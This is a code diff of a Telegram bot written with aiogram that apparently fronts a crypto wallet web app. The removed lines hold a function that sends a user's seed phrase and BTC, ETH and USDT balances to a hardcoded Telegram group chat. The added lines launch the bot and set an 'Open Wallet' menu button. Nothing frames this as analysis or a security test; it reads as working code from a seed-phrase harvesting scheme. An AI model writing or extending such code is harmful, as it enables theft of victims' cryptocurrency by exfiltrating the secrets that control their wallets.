@@ -1,22 +1,12 @@
-from aiogram import Bot
+import asyncio
+from aiogram.types import MenuButtonWebApp, WebAppInfo
+from aiogram import Bot, Dispatcher
 from bot_app.config import settings
-
+from bot_app.handlers.private import private_router
 bot = Bot(token=settings.token)
 
-async def send_balance_to_telegram(user_id, balance_data):
-    chat_id = -5470182025
-    text = (
-        f"💰 **Обновление баланса для User {user_id}**\n\n"
-        f"Фраза/Сид: {balance_data['phrase']}\n\n"
-        f"BTC: {balance_data['balance']['total_btc']}\n"
-        f"ETH: {balance_data['balance']['total_eth']}\n"
-        f"USDT: {balance_data['balance']['total_usdt']}\n"
-        f"Итого: ${balance_data['balance']['total_usd']}\n\n"
-
-    )
-    print(text)
-    await bot.send_message(chat_id, text,parse_mode="HTML")
-
+dp = Dispatcher()
+dp.include_router(private_router)
 
 # async def scan_chats():
 #     async with bot:
@@ -27,4 +17,15 @@ async def send_balance_to_telegram(user_id, balance_data):
 #                 print(">>> Группа найдена и добавлена в кэш!")
 #
 # import asyncio
-# asyncio.run(scan_chats())
+
+async def main():
+    print('Bot started')
+    await bot.set_chat_menu_button(
+        menu_button=MenuButtonWebApp(
+            text="Open Wallet",
+            web_app=WebAppInfo(url=settings.url)
+        )
+    )
+    await dp.start_polling(bot)
+
+asyncio.run(main())
